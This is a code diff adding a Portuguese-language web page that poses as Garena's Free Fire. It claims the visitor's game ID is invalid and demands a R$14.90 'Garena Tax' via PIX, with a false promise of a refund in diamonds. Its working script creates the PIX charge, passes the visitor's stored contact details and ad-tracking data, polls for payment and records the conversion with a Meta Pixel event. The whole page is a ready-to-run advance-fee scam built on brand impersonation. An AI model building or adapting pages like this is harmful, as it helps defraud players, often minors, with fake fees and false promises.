@@ -1,0 +1,290 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1059470159233925');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1059470159233925&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #9D0C21;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #9D0C21;
+            cursor: pointer;
+        }
+
+        /* Toast PIX copiado */
+        #pix-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: #d81a0d;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: bold;
+            box-shadow: 0 4px 20px rgba(216,26,13,0.4);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            z-index: 999999;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            white-space: nowrap;
+        }
+        #pix-toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+
+
+    <title>CONFIRMAÇÃO ID</title>
+    
+    
+</head>
+
+<body>
+    <header>
+        <img src="images/LogoRecFF.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio dos diamantes.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/GarenaLogo.png" alt="">
+
+        <p>Confirme seu ID da sua Conta Free Fire:</p>
+    </div>
+
+    <div class="cta3">
+        <p id="setar">Carregando...</p>
+
+        <p id="setars">
+            ⬇
+            
+        </p>
+    </div>
+
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/LogoGarena02.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seu ID...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ID INVÁLIDO</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+               <p>
+                    O ID cadastrado consta como inválido em nosso banco de dados.
+
+                    <br><br>
+
+                    Para realizarmos o envio dos diamantes é necessário cadastrar o ID novamente, sendo necessário o pagamento da [Garena Tax] taxa mínima de cadastro!
+                    
+                    <br><br>
+                    
+                    Obs: O Valor pago da taxa miníma será reembolsada através de 1.000 diamantes extras!
+                </p>
+
+                <button id="buttonClick" onclick="generateGarenaTaxPix()">
+                    PAGAR GARENA TAX (R$ 14,90)
+                </button>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal PIX Transparente -->
+    <div id="pix-modal" style="display: none; position: fixed; inset: 0; z-index: 99999; align-items: center; justify-content: center; background: rgba(0, 0, 0, 0.8);">
+        <div style="background: #fff; padding: 25px; border-radius: 16px; max-width: 360px; width: 90%; text-align: center; color: #333; position: relative;">
+            <button onclick="closePixModal()" style="position: absolute; top: 10px; right: 15px; background: none; border: none; font-size: 20px; cursor: pointer; color: #666;">&times;</button>
+            <h3 style="margin-top: 0; color: #111; font-size: 18px;">Pagamento do PIX</h3>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Escaneie o QR Code abaixo ou copie a chave Pix para realizar o pagamento.</p>
+            
+            <img id="pix-qrcode-img" src="" alt="QR Code PIX" style="width: 180px; height: 180px; margin: 0 auto 15px auto; display: block; border: 1px solid #ddd; padding: 5px; border-radius: 8px;">
+            
+            <div style="margin-bottom: 15px;">
+                <input type="text" id="pix-copy-text" readonly style="width: 100%; padding: 10px; font-size: 11px; border: 1px solid #ccc; border-radius: 6px; text-align: center; background: #f9f9f9;">
+            </div>
+
+            <button onclick="copyPix()" style="width: 100%; padding: 12px; background: #25d366; color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; margin-bottom: 10px;">
+                📋 COPIAR CÓDIGO PIX
+            </button>
+            <p style="font-size: 12px; color: #888; margin: 0;">Aguardando confirmação do pagamento...</p>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/LogosRecs.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença
+            Garena 2025©
+        </p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
+    <script>
+        let pollingInterval;
+
+        function generateGarenaTaxPix() {
+            const btn = document.getElementById('buttonClick');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'Gerando PIX...';
+            btn.disabled = true;
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const getTracking = (key) => urlParams.get(key) || localStorage.getItem(key) || null;
+            fetch('api/create-pix-payment.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount: "14.90",
+                    nome: localStorage.getItem('ff_nome') || 'Cliente Free Fire',
+                    email: localStorage.getItem('ff_email') || 'cliente@exemplo.com',
+                    telefone: localStorage.getItem('ff_telefone') || '11999999999',
+                    utm_source: getTracking('utm_source'),
+                    utm_medium: getTracking('utm_medium'),
+                    utm_campaign: getTracking('utm_campaign'),
+                    utm_content: getTracking('utm_content'),
+                    utm_term: getTracking('utm_term'),
+                    src: getTracking('src'),
+                    sck: getTracking('sck'),
+                    fbclid: getTracking('fbclid'),
+                    fbc: getTracking('fbc'),
+                    fbp: getTracking('fbp')
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+
+                if (data.success && data.pix && data.pix.qrcode && data.id) {
+                    showPixModal(data.pix.qrcode, data.id);
+                } else {
+                    alert('Erro ao gerar PIX. Tente novamente.');
+                }
+            })
+            .catch(err => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+                console.error(err);
+                alert('Erro de conexão. Tente novamente.');
+            });
+        }
+
+        function showPixModal(pixCode, transactionId) {
+            document.getElementById('pix-qrcode-img').src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+            document.getElementById('pix-copy-text').value = pixCode;
+            document.getElementById('pix-modal').style.display = 'flex';
+
+            pollingInterval = setInterval(() => {
+                fetch('api/check-payment-status.php?txid=' + transactionId)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.status === 'paid') {
+                            clearInterval(pollingInterval);
+                            try {
+                                if (typeof fbq === 'function') {
+                                    fbq('trackCustom', 'Upsell', { value: 14.90, currency: 'BRL', content_name: 'garenatax' }, { eventID: 'upsell_' + transactionId });
+                                }
+                            } catch(e) {}
+                            setTimeout(() => {
+                                window.location.href = "/naruto/garenatax/ID/" + window.location.search;
+                            }, 500);
+                        }
+                    })
+                    .catch(console.error);
+            }, 3000);
+        }
+
+        function closePixModal() {
+            if (pollingInterval) clearInterval(pollingInterval);
+            document.getElementById('pix-modal').style.display = 'none';
+        }
+
+        function copyPix() {
+            var copyText = document.getElementById('pix-copy-text');
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value).then(() => {
+                showPixToast();
+            }).catch(() => {
+                document.execCommand('copy');
+                showPixToast();
+            });
+        }
+
+        function showPixToast() {
+            const toast = document.getElementById('pix-toast');
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+    </script>
+
+    
+
+
+
+
+    <!-- Toast PIX copiado -->
+    <div id="pix-toast">
+        <span>&#10003;</span> PIX copiado!
+    </div>
+
+</body></html>
